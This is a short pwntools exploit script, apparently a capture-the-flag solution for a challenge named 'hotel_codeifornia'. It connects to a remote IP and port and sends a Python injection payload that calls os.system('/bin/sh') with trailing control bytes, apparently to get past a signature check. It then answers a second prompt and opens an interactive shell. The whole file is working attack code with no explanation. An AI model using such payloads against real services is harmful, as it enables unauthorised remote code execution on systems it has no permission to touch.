from pwn import *

#target = process('./hotel_codeifornia')
target = remote('193.57.159.27', 34814)

#pid = gdb.attach(target, "\nb *verify_sig+775\nset disassembly-flavor intel\ncontinue")

print(target.recvuntil(b'Enter code>'))

target.sendline(b'import os; os.system("/bin/sh")#\x1f\x0c')

print(target.recvuntil(b'please, sir>'))

target.sendline(hex(435)[2:].encode('ascii'))

target.interactive()


